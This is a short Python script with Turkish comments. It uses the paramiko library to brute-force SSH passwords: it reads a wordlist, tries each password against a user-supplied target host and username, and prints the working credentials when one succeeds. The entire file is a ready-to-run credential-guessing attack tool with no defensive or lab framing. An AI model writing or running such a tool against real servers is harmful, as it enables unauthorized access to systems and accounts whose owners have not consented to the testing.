import paramiko
import sys

# SSH bağlantısı için fonksiyon
def ssh_connect(host, username, password):
    try:
        # SSH client oluşturuluyor
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # SSH ile bağlantı kuruluyor
        client.connect(host, username=username, password=password)
        
        # Eğer bağlantı başarılıysa
        print(f"Başarılı giriş! Kullanıcı {username}, Şifre {password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        # Kimlik doğrulama hatası
        return False
    except Exception as e:
        print(f"Bağlantı hatası {e}")
        return False

# Bruteforce saldırısını başlatma
def brute_force_ssh(host, username, password_file):
    try:
        with open(password_file, 'r') as file:
            passwords = file.readlines()

        for password in passwords:
            password = password.strip()  # Satır sonundaki boşlukları temizle
            print(f"Deniyorum {password}")
            if ssh_connect(host, username, password):
                print("Saldırı tamamlandı. Şifre bulundu!")
                break
        else:
            print("Şifre bulunamadı.")
    except FileNotFoundError:
        print(f"Dosya bulunamadı {password_file}")
        sys.exit(1)

# Run fonksiyonu ile tüm süreci başlatma
def run():
    # Kullanıcıdan giriş bilgilerini al
    target_host = input("Hedef IP adresini girin: ")
    username = input("Kullanıcı adını girin: ")
    password_file = input("Parola dosyasının yolunu girin: ")

    # Bruteforce işlemini başlat
    brute_force_ssh(target_host, username, password_file)

if __name__ == "__main__":
    run()

